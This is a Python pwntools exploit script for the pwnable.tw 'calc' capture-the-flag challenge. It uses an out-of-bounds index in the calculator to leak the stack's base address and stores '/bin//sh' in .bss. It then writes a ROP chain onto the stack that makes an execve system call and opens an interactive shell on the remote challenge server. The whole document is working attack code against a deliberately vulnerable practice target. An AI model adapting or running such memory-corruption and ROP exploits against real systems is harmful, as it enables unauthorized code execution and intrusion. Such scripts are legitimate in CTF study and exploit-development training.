#!/usr/bin/python3

from pwn import *

def leak_at(c, index):
    c.sendline("+" + str(index + 1))
    return int(c.recvline()[:-1])

def get_ebp(c):
    ebp = leak_at(c, 359)
    if ebp < 0:
        ebp = (ebp & 0xffffffff) - 32
    return ebp

def get_index_from_address(ebp, address):
    return int((address - ebp + 0x59c)/4)

#c = process("./calc")
c = remote("chall.pwnable.tw", 10100)
bss_address = 0x080ecfc0
bss_index = 0

c.recvline()

ebp = get_ebp(c)

# These indexes are fixed since are used to write in the stack and were
# calculated according to ebp address.
indexes_gadgets_stack = [
    366, 365, 364,
    363, 362,
    361, 360
]

gadgets_values = [
    0x08094cfb, bss_address + 16, bss_address,
    bss_address + 24, 0x080701d0,
    0xb, 0x080e398d
]

log.info("ebp is " + hex(ebp))
bss_index = get_index_from_address(ebp, bss_address)

'''
save in the bss "/bin/sh"
'''
store_bin_sh_addr = str(bss_index) + "+" + str(int(bss_address + 16))
store_bin_str = str(bss_index + 4) + "+" + str(u32(b"/bin"))
store_sh_str = str(bss_index + 5) + "+" + str(u32(b"//sh"))

c.sendline(store_bin_sh_addr)
c.recvline()
c.sendline(store_sh_str)
c.recvline()
c.sendline(store_bin_str)
c.recvline()

'''
Fill the stack with the gadgets
'''
for i in range(len(indexes_gadgets_stack)):
    c.sendline("+" + str(int(indexes_gadgets_stack[i])) + "+" + str(int(gadgets_values[i])))
    c.recvline()

c.sendline("exploit")
c.interactive()

